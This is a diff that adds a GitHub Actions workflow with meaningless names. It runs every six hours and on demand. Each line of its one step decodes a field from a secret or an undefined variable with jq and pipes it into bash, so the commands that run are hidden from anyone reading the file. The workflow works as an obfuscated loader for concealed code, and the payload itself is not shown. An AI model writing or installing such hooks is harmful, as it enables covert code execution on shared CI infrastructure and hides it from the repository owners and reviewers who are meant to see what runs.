@@ -1,0 +1,24 @@
+name: jiexianzhuzhong
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '1 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiexianzhuzhong
+        env:
+          fye0: ${{ secrets.fye0 }}
+        run: |
+          echo $fye0 | jq -r .vyz9 | /bin/bash
+          echo $app38048 | jq -r .vxhg229 | /bin/bash
+          echo $bv5216 | jq -r .vzc1861 | /bin/bash
+          echo $qbym8 | jq -r .rsbe7 | /bin/bash
+          echo $y4 | jq -r .z86 | /bin/bash
+          echo $vmulz4 | jq -r .xdc483 | /bin/bash
+          echo $izmt786 | jq -r .kwcz0 | /bin/bash
+
